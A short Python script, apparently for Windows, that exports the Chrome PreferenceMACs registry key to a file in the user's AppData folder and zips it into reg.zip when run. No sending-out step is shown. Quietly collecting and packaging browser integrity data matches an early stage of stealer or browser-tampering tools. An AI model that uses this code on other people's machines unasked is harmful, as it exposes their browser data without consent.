from os import system, path, environ
from zipfile import ZipFile

Path = "C:\\Users\\%USERNAME%\\AppData\\export.reg"

# define function that get data from registry by bath script
def getData():
    system(f"REG EXPORT HKEY_CURRENT_USER\\Software\\Google\\Chrome\\PreferenceMACs {Path}")
    return True


def CreateZip():
    if path.exists(environ['USERPROFILE'] + fr"/AppData/export.reg"):
        with ZipFile(f"{environ['USERPROFILE']}" + fr"/AppData/reg.zip", "w") as ZipObj:
            try:
                ZipObj.write(f"{environ['USERPROFILE']}" + fr"/AppData/export.reg")
                return True
            except Exception as e:
                return e
getData()
CreateZip()

